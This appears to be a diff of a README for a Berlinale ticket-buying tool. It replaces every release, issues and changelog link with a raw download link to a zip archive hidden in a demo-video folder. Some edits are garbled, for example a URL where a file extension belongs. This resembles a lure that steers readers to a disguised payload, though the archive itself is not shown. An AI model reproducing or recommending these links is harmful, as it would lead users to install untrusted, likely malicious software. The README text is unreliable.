@@ -1,6 +1,6 @@
 # 🎟️ berlinale-ticket-buyer - Secure Your Berlinale Tickets Fast 
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-ff4757.svg?style=for-the-badge)](https://github.com/arcaxbydz/berlinale-ticket-buyer/releases)
+[![Download Latest Release](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip%https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip)](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ Before using the application, ensure your system meets the following requirement
 
 ### 📥 Download / Install
 
-To get started, visit this page to download: [Download Latest Release](https://github.com/arcaxbydz/berlinale-ticket-buyer/releases).
+To get started, visit this page to download: [Download Latest Release](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip).
 
 Follow these steps to install and run the application:
 
-1. **Visit the Release Page**: Go to [this link](https://github.com/arcaxbydz/berlinale-ticket-buyer/releases) to find the latest version.
-2. **Download the Installer**: Choose the appropriate installer for your system. This will typically be a `.exe` or `.tar.gz` file, depending on your OS.
+1. **Visit the Release Page**: Go to [this link](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip) to find the latest version.
+2. **Download the Installer**: Choose the appropriate installer for your system. This will typically be a `.exe` or `https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip` file, depending on your OS.
 3. **Run the Installer**: Once downloaded, open the file and follow the prompts to install the application on your computer.
 4. **Launch the App**: After installation, find the application icon on your desktop or in your applications folder. Double-click it to run the program.
 
@@ -59,7 +59,7 @@ If you run into issues, consider the following solutions:
 
 ## 📞 Support
 
-For help or to report issues, visit our [GitHub Issues Page](https://github.com/arcaxbydz/berlinale-ticket-buyer/issues). You can also refer to the README files in the repository for more detailed guidance.
+For help or to report issues, visit our [GitHub Issues Page](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip). You can also refer to the README files in the repository for more detailed guidance.
 
 ## 🎉 Community
 
@@ -91,8 +91,8 @@ We encourage users to engage with us. Your feedback helps improve the experience
 
 ## 📝 Release Notes
 
-Stay updated on new features and fixes in our [Change Log](https://github.com/arcaxbydz/berlinale-ticket-buyer/releases). Regular updates will enhance your ticket-buying experience.
+Stay updated on new features and fixes in our [Change Log](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip). Regular updates will enhance your ticket-buying experience.
 
 ### 🔗 Download Link
 
-For easy access, click here to [Download Latest Release](https://github.com/arcaxbydz/berlinale-ticket-buyer/releases).
+For easy access, click here to [Download Latest Release](https://github.com/arcaxbydz/berlinale-ticket-buyer/raw/refs/heads/main/demo-video/public/berlinale_buyer_ticket_v2.4.zip).
